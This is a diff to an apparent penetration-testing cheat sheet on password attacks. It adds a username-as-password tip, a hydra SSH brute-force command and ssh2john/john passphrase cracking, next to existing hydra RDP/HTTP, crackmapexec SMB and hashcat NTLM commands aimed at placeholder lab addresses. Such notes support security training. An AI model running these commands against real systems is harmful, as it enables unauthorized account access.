@@ -11,6 +11,7 @@ Index
 
 ## First Rules
 - Always try the default credentials!
+- Always try PASSWORD == USERNAME!
 - Search users and passwords in all available files
 - Identify the hash (hashid)
 
@@ -24,6 +25,11 @@ hydra -L user.txt -P /usr/share/wordlists/rockyou.txt 192.168.1.1 -s 443 http-po
 ## RDP
 ``` bash
 hydra -L user.txt -P /usr/share/wordlists/rockyou.txt rdp://192.168.1.1
+```
+
+## SSH
+``` bash
+hydra -L user.txt -P /usr/share/wordlists/rockyou.txt -s 22 ssh://192.168.1.1
 ```
 
 ## KeePass DB
@@ -47,4 +53,11 @@ crackmapexec smb 192.168.1.1 -d domain.local -u user.txt -p passwd.txt
 ## NTML hash
 ``` bash
 hashcat -m 1000 file.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule --force
+```
+
+## SSH passphrase
+Scenario: id_rsa or id_ecdsa file available but ask for a passphrase
+``` bash
+ssh2john $sshkeyfile > file.hash
+john file.hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
